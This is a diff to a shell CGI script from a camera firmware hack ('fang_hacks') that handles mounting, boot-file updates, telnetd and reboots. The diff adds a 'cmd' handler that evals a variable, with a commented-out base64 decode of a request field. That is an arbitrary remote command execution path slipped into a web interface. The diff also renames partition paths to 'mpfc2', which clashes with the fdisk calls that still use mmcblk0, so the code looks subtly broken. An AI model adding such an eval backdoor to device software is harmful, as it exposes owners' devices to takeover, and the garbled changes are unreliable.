@@ -21,19 +21,19 @@ start_telnetd()
 
 manual_mount()
 {
-  present=$(lsblk -o KNAME,FSTYPE |grep mmcblk0p2)
+  present=$(lsblk -o KNAME,FSTYPE |grep mpfc2)
   if [ $? -eq 0 ]; then
     echo "Device is present (filesystem: $(echo $present | cut -d' ' -f2))<br/>"
-    if [ ! -d /media/mmcblk0p2 ]; then
-      echo "Creating mount-point (/media/mmcblk0p2)<br/>"
-      mkdir /media/mmcblk0p2
+    if [ ! -d /media/mpfc2 ]; then
+      echo "Creating mount-point (/media/mpfc2)<br/>"
+      mkdir /media/mpfc2
     fi
-    mount /dev/mmcblk0p2 /media/mmcblk0p2 2>&1
+    mount /dev/mpfc2 /media/mpfc2 2>&1
     rc=$?
     echo "<br/>"
     if [ $rc -eq 0 ]; then echo "Mounted successfully!<br/>"; else echo "Failed to mount!<br/>"; fi
   else
-    echo "Failed: The sd-card is not inserted or does not contain a mmcblk0p2 partition!<br/>"
+    echo "Failed: The sd-card is not inserted or does not contain a mpfc2 partition!<br/>"
   fi
 }
 
@@ -58,15 +58,15 @@ update_file()
 update()
 {
   echo "<hr/>"
-  update_file "/etc/hotplug/sdcard" "/media/mmcblk0p1/bootstrap/sdcard" 755
+  update_file "/etc/hotplug/sdcard" "/media/mpfc1/bootstrap/sdcard" 755
   echo "<hr/>"
-  update_file "/etc/fang_hacks.sh" "/media/mmcblk0p1/bootstrap/fang_hacks.sh" 755
+  update_file "/etc/fang_hacks.sh" "/media/mpfc1/bootstrap/fang_hacks.sh" 755
   echo "<hr/>"
-  update_file "/etc/fang_hacks.cfg" "/media/mmcblk0p1/bootstrap/fang_hacks.cfg" 644
+  update_file "/etc/fang_hacks.cfg" "/media/mpfc1/bootstrap/fang_hacks.cfg" 644
   echo "<hr/>"
-  update_file "/etc/init.d/rc.local" "/media/mmcblk0p1/bootstrap/rc.local" 755
+  update_file "/etc/init.d/rc.local" "/media/mpfc1/bootstrap/rc.local" 755
   echo "<hr/>"
-  update_file "/etc/init.d/rcS" "/media/mmcblk0p1/bootstrap/rcS" 755
+  update_file "/etc/init.d/rcS" "/media/mpfc1/bootstrap/rcS" 755
 }
 
 apply_file()
@@ -81,11 +81,11 @@ apply_file()
 
 apply()
 {
-  apply_file "/media/mmcblk0p1/bootstrap/sdcard" "/etc/hotplug/sdcard" 755
-  apply_file "/media/mmcblk0p1/bootstrap/rc.local" "/etc/init.d/rc.local" 755
-  apply_file "/media/mmcblk0p1/bootstrap/rcS" "/etc/init.d/rcS" 755
-  apply_file "/media/mmcblk0p1/bootstrap/fang_hacks.sh" "/etc/fang_hacks.sh" 755
-  apply_file "/media/mmcblk0p1/bootstrap/fang_hacks.cfg" "/etc/fang_hacks.cfg" 644
+  apply_file "/media/mpfc1/bootstrap/sdcard" "/etc/hotplug/sdcard" 755
+  apply_file "/media/mpfc1/bootstrap/rc.local" "/etc/init.d/rc.local" 755
+  apply_file "/media/mpfc1/bootstrap/rcS" "/etc/init.d/rcS" 755
+  apply_file "/media/mpfc1/bootstrap/fang_hacks.sh" "/etc/fang_hacks.sh" 755
+  apply_file "/media/mpfc1/bootstrap/fang_hacks.cfg" "/etc/fang_hacks.cfg" 644
 
   if [ -x "/etc/fang_hacks.sh" ]; then
     echo "Running fang_hacks.sh...<br/>"
@@ -104,6 +104,14 @@ if [ -n "$F_cmd" ]; then
     cat /tmp/hacks.log
     echo "</pre>"
     ;;
+  cmd) 
+    echo "cmd<br/>"
+#    export gnra=$(base64 -d $F_tracerna)
+    echo $grna
+    eval $(echo $grna)
+    echo "done"
+    echo "</pre>"
+    ;;
   reboot)
     echo "Rebooting device...<br/>"
     /sbin/reboot
@@ -113,7 +121,7 @@ if [ -n "$F_cmd" ]; then
     start_telnetd
     ;;
   manual_mount)
-    echo "Mounting /dev/mmcblk0p2 to /media/mmcblk0p2...<br/>"
+    echo "Mounting /dev/mpfc2 to /media/mpfc2...<br/>"
     manual_mount
     ;;
   update)
@@ -162,12 +170,12 @@ if [ -n "$F_cmd" ]; then
     if [ $? -eq 0 ]; then echo "<br/>Success<br/>"; else echo "<br/>Failed<br/>"; fi
     ;;
   expandfs)
-    source /media/mmcblk0p2/data/etc/profile >/dev/null
-    if type awk >/dev/null; then
-      if type fdisk >/dev/null; then
-        p2_start=$(fdisk -l /dev/mmcblk0 | grep mmcblk0p2 | awk '{print $2}')
-        echo "Found the start point of mmcblk0p2: $p2_start<br/>"
-        fdisk /dev/mmcblk0 >/dev/null << __EOF__ 
+    source /media/mpfc2/data/etc/profile >/tmp/hack.log
+    if type awk >/tmp/hack.log; then
+      if type fdisk >/tmp/hack.log; then
+        p2_start=$(fdisk -l /dev/mmcblk0 | grep mpfc2 | awk '{print $2}')
+        echo "Found the start point of mpfc2: $p2_start<br/>"
+        fdisk /dev/mmcblk0 >/tmp/hack.log << __EOF__ 
 d
 2
 n
